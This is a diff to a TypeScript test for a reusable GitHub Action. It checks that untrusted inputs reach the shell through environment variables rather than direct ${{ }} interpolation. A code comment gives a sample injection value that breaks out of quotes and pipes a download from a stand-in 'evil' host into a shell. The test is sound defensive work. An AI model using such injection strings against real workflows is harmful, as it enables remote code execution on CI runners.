@@ -6,7 +6,14 @@ import { parse as parseYaml } from 'yaml';
 // Validate the reusable composite Action's contract so the bin path / input
 // wiring can't drift. speclock's CI dogfoods the action (the `self-gate` job).
 interface ActionYml {
-  runs: { using: string; steps: Array<{ run?: string; 'working-directory'?: string }> };
+  runs: {
+    using: string;
+    steps: Array<{
+      run?: string;
+      'working-directory'?: string;
+      env?: Record<string, string>;
+    }>;
+  };
   inputs: Record<string, { default?: string }>;
 }
 
@@ -29,8 +36,17 @@ describe('reusable GitHub Action', () => {
     );
     expect(runStep, 'no step invokes dist/cli/index.js').toBeDefined();
     expect(runStep!.run).toContain('check');
-    expect(runStep!.run).toContain('inputs.runner');
-    expect(runStep!.run).toContain('inputs.dir');
+    // Untrusted inputs reach the script via the environment and are referenced
+    // as shell variables — they must NOT be interpolated with ${{ }} directly
+    // into the run block (script injection: a value like '"; curl evil | sh; "'
+    // would break out of the quotes). Inputs are still honored, via env.
+    expect(runStep!.run).toContain('"$SPECLOCK_RUNNER"');
+    expect(runStep!.run).toContain('"$SPECLOCK_DIR"');
+    expect(runStep!.env?.SPECLOCK_RUNNER).toContain('inputs.runner');
+    expect(runStep!.env?.SPECLOCK_DIR).toContain('inputs.dir');
+    // Security regression guard: no direct interpolation of inputs in the script.
+    expect(runStep!.run).not.toContain('inputs.runner');
+    expect(runStep!.run).not.toContain('inputs.dir');
     // The step must run in the caller's project dir (regression for review #9).
     expect(runStep!['working-directory']).toBe('${{ inputs.working-directory }}');
   });
